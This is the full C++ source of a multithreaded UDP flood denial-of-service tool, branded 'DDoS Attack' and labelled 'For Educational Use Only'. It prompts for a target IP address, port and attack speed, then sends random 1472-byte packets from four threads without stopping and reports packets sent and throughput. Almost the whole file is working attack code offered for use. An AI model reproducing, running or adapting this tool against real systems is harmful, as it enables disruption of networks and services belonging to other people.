#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <string>
#include <cstdlib>
#include <ctime>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>

using namespace std;

// Configuration parameters
const size_t PAYLOAD_SIZE = 1472;
const int THREAD_NUM = 4;
atomic<bool> running(true);
atomic<uint64_t> total_sent(0);

// Terminal color macros
#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define CYAN    "\033[36m"

// Clear screen function
void clear_screen() {
#ifdef _WIN32
    system("cls");
#else
    system("clear");
#endif
}

// Generate random payload
vector<char> generate_payload() {
    vector<char> payload(PAYLOAD_SIZE);
    for (size_t i = 0; i < PAYLOAD_SIZE; ++i) {
        payload[i] = rand() % 256;
    }
    return payload;
}

// Validate IP address format
bool validate_ip(const string& ip_str) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip_str.c_str(), &(sa.sin_addr)) != 0;
}

// Worker thread function
void send_worker(const string& target_ip, int target_port, double delay) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        return;
    }

    // Optional: set non-blocking mode
    // fcntl(sockfd, F_SETFL, O_NONBLOCK);

    struct sockaddr_in target_addr{};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);

    auto payload = generate_payload();

    while (running) {
        ssize_t sent = sendto(sockfd, payload.data(), payload.size(), 0,
                              (struct sockaddr*)&target_addr, sizeof(target_addr));
        if (sent > 0) {
            total_sent++;
        }

        if (delay > 0) {
            usleep(static_cast<unsigned int>(delay * 1000000));
        }
    }
    close(sockfd);
}

// Print startup banner (mimics Python version)
void print_banner() {
    // Try to call figlet; fall back to plain text if not installed
    int figlet_result = system("figlet DDoS Attack");

    if (figlet_result != 0) {
        cout << GREEN << "DDoS Attack Tool (Figlet not installed)" << RESET << endl;
    }

    cout << endl;
    cout << GREEN << "/------------------------------------------\\ " << RESET << endl;
    cout << GREEN << "|  " << RESET << "Author" << GREEN << "         : Ryan" << string(32, ' ') << GREEN << " |" << RESET << endl;
    cout << GREEN << "|  " << RESET << "Version" << GREEN << "        : V1.1.1" << string(30, ' ') << GREEN << " |" << RESET << endl;
    cout << GREEN << "\\------------------------------------------/ " << RESET << endl;
    cout << endl;
    cout << YELLOW << " --------------[For Educational Use Only]--------------- " << RESET << endl;
    cout << endl;
}

int main() {
    srand(time(nullptr));
    string target_ip;
    int target_port;
    int speed;

    // 1. Display current time
    time_t now = time(0);
    char* dt = ctime(&now);
    cout << "Current time: " << dt << endl;

    // 2. Clear screen and show banner after 2 seconds
    usleep(2000000);
    clear_screen();
    print_banner();

    // 3. User input

    // IP input
    while (true) {
        cout << "Enter target IP address: ";
        cin >> target_ip;
        if (validate_ip(target_ip)) break;
        cout << "[!] Invalid IP address. Please try again!" << endl;
    }

    // Port input
    while (true) {
        cout << "Enter target port: ";
        if ((cin >> target_port) && target_port >= 1 && target_port <= 65535) {
            break;
        } else {
            cout << "[!] Port must be between 1 and 65535." << endl;
            cin.clear();
            cin.ignore(1024, '\n');
        }
    }

    // Speed input
    while (true) {
        cout << "Attack speed (1~1000): ";
        if ((cin >> speed) && speed >= 1 && speed <= 1000) {
            break;
        } else {
            cout << "[!] Speed must be between 1 and 1000." << endl;
            cin.clear();
            cin.ignore(1024, '\n');
        }
    }

    double delay = (1000.0 - speed) / 2000.0;

    // 4. Preparation before attack
    clear_screen();
    cout << GREEN << "[+] Starting UDP Flood attack on " << target_ip << ":" << target_port << "..." << RESET << endl;
    cout << GREEN << "[+] Press Ctrl+C to stop at any time." << RESET << endl;
    cout << string(50, '-') << endl;

    // 5. Launch threads
    vector<thread> threads;
    for (int i = 0; i < THREAD_NUM; ++i) {
        threads.emplace_back(send_worker, target_ip, target_port, delay);
    }

    // 6. Real-time statistics loop
    uint64_t last_count = 0;
    try {
        while (running) {
            uint64_t current = total_sent.load();
            uint64_t diff = current - last_count;
            last_count = current;

            // Calculate throughput in MB/s
            double mbps = (diff * PAYLOAD_SIZE) / (1024.0 * 1024.0);

            // Single-line refresh
            cout << "\r" << CYAN << "Sent " << current << " packets | Throughput: "
                 << fixed << setprecision(2) << mbps << " MB/s      " << RESET << flush;

            this_thread::sleep_for(chrono::seconds(1));
        }
    } catch (...) {
        // Handle Ctrl+C gracefully
    }

    // 7. Cleanup
    running = false;
    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    cout << "\n\n" << GREEN << "[!] Attack stopped." << RESET << endl;
    cout << GREEN << "[i] Total UDP packets sent: " << total_sent.load() << "." << RESET << endl;

    return 0;
}